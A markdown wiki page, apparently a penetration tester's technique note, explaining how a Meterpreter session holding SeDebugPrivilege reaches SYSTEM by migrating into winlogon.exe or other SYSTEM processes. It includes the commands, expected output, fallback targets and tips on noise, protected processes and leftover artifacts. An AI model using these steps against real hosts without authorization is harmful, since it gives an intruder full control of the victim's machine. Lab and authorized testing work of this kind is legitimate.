---
title: Windows SeDebugPrivilege → SYSTEM via Meterpreter Migrate
slug: windows-sedebugprivilege-migrate
category: techniques
updated: 2026-07-26
summary: "SeDebugPrivilege (even Disabled) → migrate to winlogon.exe → SYSTEM; no getsystem or potato needed"
tags: [windows, privesc, sedebug, meterpreter, system, token, privilege]
sensitive: false
---

# Windows SeDebugPrivilege → SYSTEM via Meterpreter Migrate

## When to use
`whoami /priv` shows `SeDebugPrivilege` (Enabled OR Disabled — both work). You have a meterpreter session. Skip potatoes and `getsystem`.

```cmd
whoami /priv | findstr /i debug
REM SeDebugPrivilege  Adjust memory quotas for a process  Disabled   <- still works
```

## Key facts / commands

**Migrate to SYSTEM process**:
```
meterpreter > migrate -N winlogon.exe
```
Meterpreter internally enables `SeDebugPrivilege` before opening the target process handle — no manual `load priv` or token manipulation needed.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Other SYSTEM-running targets** (if winlogon.exe is protected or unavailable):
```
migrate -N lsass.exe      # works but noisy — LSASS dump risk
migrate -N services.exe   # also SYSTEM
```

**Verify privilege first**:
```
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > getprivs        # shows all privs including disabled ones
```

## Gotchas
- `load priv` is for `getsystem` (named-pipe impersonation) — **not** required for `migrate`. Don't conflate the two.
- `getsystem` via meterpreter RPC (msfrpcd) errors: `undefined method 'config'` — use `migrate` directly instead.
- If migration fails (access denied), the process may be PPL-protected. Try `services.exe` or `svchost.exe` (SYSTEM-owned, less protected).
- After migration, the session is now inside the target process — crashing it loses the session.
- winlogon.exe is single-instance; migrating into it is stable but leaves artifacts in the process's thread list.

## References
- Relacionado: [[privilege-escalation]], [[windows-nssm-job-escape]], [[msfrpcd-api]], [[gtfobins-binaries]]
- Evidence: a Windows Server 2022 lab
- MSDN: SeDebugPrivilege — allows opening any process handle regardless of DACL
